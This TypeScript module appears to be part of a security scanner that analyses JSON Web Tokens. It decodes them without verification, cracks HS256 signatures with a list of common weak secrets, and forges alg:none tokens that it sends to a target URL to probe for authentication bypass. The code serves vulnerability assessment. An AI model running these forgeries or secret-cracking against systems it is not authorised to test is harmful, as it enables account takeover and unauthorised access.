/**
 * Scanner: JWT analyzer
 *
 * JWT-specific security tests: decode without verify, crack weak HS256
 * secrets, algorithm confusion (RS256→HS256), alg:none bypass.
 */

import { createHmac } from "crypto"
import { httpRequest } from "../http-client"
import type { SessionID } from "../../session/schema"

export interface JwtAnalysisResult {
  decoded: JwtDecoded | null
  weaknesses: JwtWeakness[]
  cracked?: { secret: string; algorithm: string }
}

export interface JwtDecoded {
  header: Record<string, unknown>
  payload: Record<string, unknown>
  signature: string
  expired: boolean
  expiresAt?: string
}

export interface JwtWeakness {
  type: string
  severity: "critical" | "high" | "medium" | "low"
  description: string
  evidence: string
}

function base64UrlDecode(str: string): string {
  const padded = str.replace(/-/g, "+").replace(/_/g, "/")
  return Buffer.from(padded, "base64").toString("utf-8")
}

function base64UrlEncode(data: Buffer): string {
  return data.toString("base64").replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "")
}

/** Decode a JWT without signature verification. */
export function decodeJwt(token: string): JwtDecoded | null {
  const parts = token.split(".")
  if (parts.length !== 3) return null

  try {
    const header = JSON.parse(base64UrlDecode(parts[0]))
    const payload = JSON.parse(base64UrlDecode(parts[1]))

    let expired = false
    let expiresAt: string | undefined
    if (payload.exp) {
      expiresAt = new Date(payload.exp * 1000).toISOString()
      expired = payload.exp * 1000 < Date.now()
    }

    return { header, payload, signature: parts[2], expired, expiresAt }
  } catch {
    return null
  }
}

// Common weak secrets for HS256
const WEAK_SECRETS = [
  "secret", "password", "123456", "key", "jwt_secret", "changeme",
  "test", "admin", "default", "supersecret", "mysecret", "jwt",
  "token", "abc123", "letmein", "1234567890", "qwerty",
]

function walk(
  input: unknown,
  path: string,
  visit: (path: string, value: unknown) => void,
) {
  visit(path, input)
  if (!input || typeof input !== "object") return
  if (Array.isArray(input)) {
    let index = 0
    for (const item of input) {
      walk(item, `${path}[${index++}]`, visit)
    }
    return
  }
  const value = input as Record<string, unknown>
  for (const key of Object.keys(value)) {
    const next = path ? `${path}.${key}` : key
    walk(value[key], next, visit)
  }
}

/** Try to crack HS256 JWT with common secrets. */
function crackHs256(token: string): { secret: string; algorithm: string } | undefined {
  const parts = token.split(".")
  if (parts.length !== 3) return undefined

  const headerPayload = `${parts[0]}.${parts[1]}`
  const signature = parts[2]

  for (const secret of WEAK_SECRETS) {
    const expected = base64UrlEncode(createHmac("sha256", secret).update(headerPayload).digest())
    if (expected === signature) {
      return { secret, algorithm: "HS256" }
    }
  }
  return undefined
}

/** Forge a token with alg:none. */
function forgeAlgNone(token: string): string {
  const parts = token.split(".")
  if (parts.length !== 3) return token

  const header = { alg: "none", typ: "JWT" }
  const encodedHeader = base64UrlEncode(Buffer.from(JSON.stringify(header)))
  return `${encodedHeader}.${parts[1]}.`
}

/**
 * Analyze a JWT token for security weaknesses.
 */
export function analyzeJwt(token: string): JwtAnalysisResult {
  const decoded = decodeJwt(token)
  const weaknesses: JwtWeakness[] = []

  if (!decoded) {
    return { decoded: null, weaknesses: [{ type: "invalid", severity: "low", description: "Invalid JWT format", evidence: token.slice(0, 50) }] }
  }

  // Check algorithm
  const alg = String(decoded.header.alg ?? "none").toUpperCase()

  if (alg === "NONE" || alg === "") {
    weaknesses.push({
      type: "alg_none",
      severity: "critical",
      description: "JWT uses alg:none — signature not verified",
      evidence: `Header: ${JSON.stringify(decoded.header)}`,
    })
  }

  if (alg === "HS256" || alg === "HS384" || alg === "HS512") {
    const cracked = crackHs256(token)
    if (cracked) {
      weaknesses.push({
        type: "weak_secret",
        severity: "critical",
        description: `JWT HS256 secret cracked: "${cracked.secret}"`,
        evidence: `Secret "${cracked.secret}" produces valid signature`,
      })
      return { decoded, weaknesses, cracked }
    }
  }

  // Check expiration
  if (decoded.expired) {
    weaknesses.push({
      type: "expired",
      severity: "low",
      description: "JWT has expired",
      evidence: `Expires: ${decoded.expiresAt}`,
    })
  }

  if (!decoded.payload.exp) {
    weaknesses.push({
      type: "no_expiration",
      severity: "medium",
      description: "JWT has no expiration claim",
      evidence: `Payload has no 'exp' field`,
    })
  }

  // Check for sensitive data in payload
  const sensitiveKeys = ["password", "secret", "ssn", "credit_card", "cc", "cvv"]
  walk(decoded.payload, "", (path, value) => {
    const key = path.split(".").at(-1) ?? path
    if (!key) return
    if (!sensitiveKeys.some((item) => key.toLowerCase().includes(item))) return
    if (value === undefined || value === null || value === "") return
    weaknesses.push({
      type: "sensitive_data",
      severity: "high",
      description: `JWT contains potentially sensitive field: ${path}`,
      evidence: `Payload path: ${path}`,
    })
  })

  // Check for admin/role claims that might be manipulable
  walk(decoded.payload, "", (path, value) => {
    const key = path.split(".").at(-1) ?? path
    if (!key) return
    if (!["role", "admin", "is_admin"].includes(key.toLowerCase())) return
    if (value === undefined || value === null || value === "") return
    weaknesses.push({
      type: "role_in_token",
      severity: "medium",
      description: "JWT contains role/admin claims — test for privilege escalation via token manipulation",
      evidence: `Path ${path}=${String(value)}`,
    })
  })

  return { decoded, weaknesses }
}

/**
 * Test JWT-based auth endpoints for weaknesses.
 */
export async function testJwtAuth(
  url: string,
  token: string,
  options: { timeout?: number; sessionID?: SessionID | string } = {},
): Promise<{ weaknesses: JwtWeakness[]; algNoneAccepted: boolean; expiredAccepted: boolean }> {
  const { timeout = 10_000, sessionID } = options
  const weaknesses: JwtWeakness[] = []
  let algNoneAccepted = false
  let expiredAccepted = false

  // Test alg:none bypass
  const noneToken = forgeAlgNone(token)
  const noneResp = await httpRequest(url, {
    headers: { Authorization: `Bearer ${noneToken}` },
    timeout,
    sessionID,
  })
  if (noneResp.status >= 200 && noneResp.status < 400) {
    algNoneAccepted = true
    weaknesses.push({
      type: "alg_none_bypass",
      severity: "critical",
      description: "Server accepts JWT with alg:none — authentication bypass",
      evidence: `Token with alg:none returned ${noneResp.status}`,
    })
  }

  // Test with original (possibly expired) token
  const resp = await httpRequest(url, {
    headers: { Authorization: `Bearer ${token}` },
    timeout,
    sessionID,
  })
  const decoded = decodeJwt(token)
  if (decoded?.expired && resp.status >= 200 && resp.status < 400) {
    expiredAccepted = true
    weaknesses.push({
      type: "expired_accepted",
      severity: "high",
      description: "Server accepts expired JWT tokens",
      evidence: `Expired token (${decoded.expiresAt}) returned ${resp.status}`,
    })
  }

  return { weaknesses, algNoneAccepted, expiredAccepted }
}
